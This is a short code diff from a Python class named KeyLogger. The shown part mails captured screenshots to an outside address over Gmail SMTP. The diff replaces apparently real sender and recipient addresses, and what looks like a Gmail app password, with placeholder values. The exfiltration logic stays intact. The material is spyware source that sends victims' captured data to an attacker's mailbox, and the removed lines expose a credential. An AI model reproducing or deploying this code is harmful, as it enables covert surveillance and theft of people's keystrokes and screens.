@@ -85,8 +85,8 @@ class KeyLogger:
                     
                 msg = MIMEMultipart()
                 msg['Subject'] = 'screen_capture'
-                msg['From'] = 'dafgasg94@gmail.com'
-                msg['To'] = 'stifki234@abv.bg'            
+                msg['From'] = 'sender@sender.com'
+                msg['To'] = 'receiver@receiver.com'            
                     
                 text = MIMEText('screen_capture_test')
                 msg.attach(text)
@@ -97,7 +97,7 @@ class KeyLogger:
                 s = smtplib.SMTP("smtp.gmail.com", 587)
                 s.ehlo()
                 s.starttls()
-                s.login('dafgasg94@gmail.com', 'rfhs audu ymiw piam')
+                s.login('sender@sender.com', '')
                 s.sendmail(msg['From'], msg['To'], msg.as_string())
                 s.quit()            
                     
